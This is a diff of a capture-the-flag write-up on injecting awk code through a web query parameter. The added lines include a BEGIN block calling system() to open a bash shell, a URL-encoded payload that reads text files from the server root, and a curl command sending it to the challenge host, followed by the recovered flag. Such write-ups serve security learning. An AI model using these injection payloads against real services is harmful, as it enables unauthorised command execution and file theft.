@@ -529,19 +529,31 @@ command = ["awk", f"/{query}/", "info.log"]
 - Then, I tried to check if the regex parser also executes perl code.I placed the `BEGIN` code in the new lines middle and got a `/bin/sh` shell.
 
 ```python3
->>> command = ["awk", '//\nBEGIN {system("/bin/bash")}', "info.log"]
+>>> command = ["awk", '//\nBEGIN {system("/bin/bash")}\n//', "info.log"]
 >>> result = subprocess.run(
 ...             command,
 ...             text=True
 ...         )
 
 ```
-<img width="755" height="157" alt="image" src="https://github.com/user-attachments/assets/8c5acde9-3001-45a5-80dc-4a739586f7f8" />
+<img width="857" height="146" alt="image" src="https://github.com/user-attachments/assets/39cd3c79-2f8b-44f1-bb35-6fb34b4ac084" />
 
-- Urlencoding it to read the flag-:
+
+- Urlencoding the payload to read the flag-:
 
 ```
+/%0ABEGIN%20{system("cat%20/*.txt")}%0a/
 ```
+
+- Curly curl-:
+
+```bash
+curl -s http://34.170.146.252:29894/ -d 'query=/%0ABEGIN%20{system("cat%20/*.txt;")}%0a/' -o result.txt;head -n 100 result.txt
+```
+
+- Flag-: ```Alpaca{th3_AWK_Pr0gr4mming_Lan9u4g3}```
+
+<img width="1459" height="419" alt="image" src="https://github.com/user-attachments/assets/eaf29950-703e-4f3e-bace-bf22a8ee4b8b" />
 
 
 
